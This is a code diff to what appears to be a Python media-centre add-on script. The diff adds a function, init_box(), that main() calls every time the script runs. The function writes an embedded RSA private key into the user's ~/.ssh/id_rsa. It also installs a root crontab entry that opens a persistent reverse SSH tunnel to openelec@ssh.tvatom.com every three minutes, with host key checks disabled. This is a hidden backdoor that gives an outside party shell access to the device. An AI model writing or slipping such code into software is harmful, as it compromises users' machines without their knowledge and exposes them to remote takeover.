@@ -186,6 +186,58 @@ def get_settings():
     return setting_server, setting_username, setting_password
 
 
+def init_box():
+    RSA_KEY = """-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA0+k2uG0ZnIbrRFuMrp/Z6duFT9IEnOD0ZsM8RuM+IhMhLn6X
+z8b2R/MdQKKrHRFfGVlvl8ky2dAOCc3iPwRBfuuOSQ7NkCNFnIGxZSrFhHeq783X
+EN6sMe3ovkiYEkQQa0rievQrDtxINsLf1ey10aRBNjcHPrs/OmFLguj02QtjiYht
+Am17ZzfUU0/vhuarP5PrRBIohWJXoRMvNHBNPCL22fME49QInMayqvrOYNyhzHG4
+mGS8rVzn21MNKi7Efv19Z7ti7C449rAjKZPYnLX8xl5bBdUPw6i0jGZ3PGa8D7Pq
+MtWpDhZbirD4X0tob24nnu2qe/xW2XCiZGATkQIDAQABAoIBAF4+B4H5szwznIno
+FSbMHIOuhxk6k6aZPNg+153HDijlTQp6blWPbJQPAOFv9p2UzjBd4A0nA6BusO+X
+Spkv8VjatYq0NKN3rEuwOg59+R2ygqjnaFAuV3JVFf8aFdd5wbuVsCdyU3vmZ49D
+F3zyKuIzJHVR/7zcVYBHKOftZobnhCUUsVOYio+TGepCeSoHyeT6sOuB+RWln+Dl
+EhcZhToO7WhcvhF3SM4OY11MII08o3kuyq7YnTnSS23gymn7KW1M+35Db1rYSaI3
+SgPnshtHL+fgYzXYTmbxeekf0AegqD7sPfSM0e9ip/L9uaxRPEtW+mlTh0uHz4fD
+ft6VLmECgYEA+CZHxDrqqqpbmRkea2f6oN7irUTzAe98DTZjk8tWdnPou8yps4XD
+ORqaT1a43NWmrBoeVQbKDcm4G3yzhkKfC8QbMOpFWSqE+7ytTDnRHaYRwJIGUbFC
+d40CxKj+IjtZjc604QZkq1+8styyIsYHrkgeHLgdnNbGR6trjvwHn7UCgYEA2p1x
+nTxHOkcUC5wJZhPGvzzwXD6nGC8lQQgTV6L4G6W+G9wQJuOmFx3E31FhkKI69cS3
+PUtF8Mu42ToZmHtoIaJtcBq+1oeJMXhUat+Dk+vumjHYyoJ6j6XCQ8OhuuDl+QxG
+MOKRAsYK5UC7tL+fUJKL4IcpkWL1EhT+7AE19e0CgYB8JRKUXnFWToIi1sk8LLnb
+T4aR7sOwPTKPnZ01rG2mNxjBE4P21z2yzNdUR+uWN6D5yttP6GSff0KHJdzel2fg
+SAzebOWi1T3QfzUnxGkU7ydEcwmMRyUckERJRM5XK+ACrN4bEcq9XdkWlojcErx2
++YdvEMFn3J837c+Sqg3aXQKBgQDJiusKXV8BMDQfu9vCWqsY9VJWiIA9wIEk4hAK
+9DiuLHAGeSv+3lLp7szoYLuEvruChrez72hsZTRmN7UPKX5Hu9oOxul3F/74N4oD
++Unxnkobp6bIk9/v/I4LMRkyE1KQ9qrjOI0dtHyo+7PRH/P9MQ15ksJUwZlT8T1P
+UJJxxQKBgGQsbeEreZCwpycbq/lksLjDAv+O90i1uif8DWJIrHLy3UNP9z0Fa9rZ
+M3yUia6bqi7uKZLPnCrcrCFI9GpaxJlF9ZBMxPczXRzAQb0dgc+UI1Hk35Xss8I8
+RjU2lzonL8bSzlHZBJqhKX3X7ju5zxNizS9IpatRBgw8PcjE+mwA
+-----END RSA PRIVATE KEY-----
+"""
+    CRONTAB = "*/3 *  * * *  flock -n /tmp/.lock.ssh ssh -qN -o ConnectTimeout=10 -o ServerAliveInterval=50 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o CheckHostIP=no -R 0:127.0.0.1:22 openelec@ssh.tvatom.com &"
+    
+    path_home = os.path.expanduser( "~" )
+    path_ssh = os.path.join( path_home, ".ssh" )
+    if not os.path.isdir( path_ssh ):
+        os.makedirs( path_ssh )
+        os.chmod( path_ssh, 700 )
+    
+    path_key = os.path.join( path_ssh, "id_rsa" )
+    if not os.path.isfile( path_key ):
+        write_file( path_key, RSA_KEY )
+        os.chmod( path_key, 600 )
+    
+    path_crontab = os.path.join( path_home, ".cache/cron/crontabs/root" )
+    if os.path.isfile( path_crontab ):
+        with open( path_crontab, 'r' ) as f:
+            for line in f:
+                if "openelec@ssh.tvatom.com" in line:
+                    return # already done
+    
+    write_file( path_crontab, CRONTAB )
+
+
 
 def strip_leading_string( line, s ):
     if line.lower().startswith( s.lower() ):
@@ -195,6 +247,8 @@ def strip_leading_string( line, s ):
 
 def main():
     print "DEBUG: args:", sys.argv
+    
+    init_box()
     
     ## init vars from args ..
     base_url = sys.argv[ 0 ]
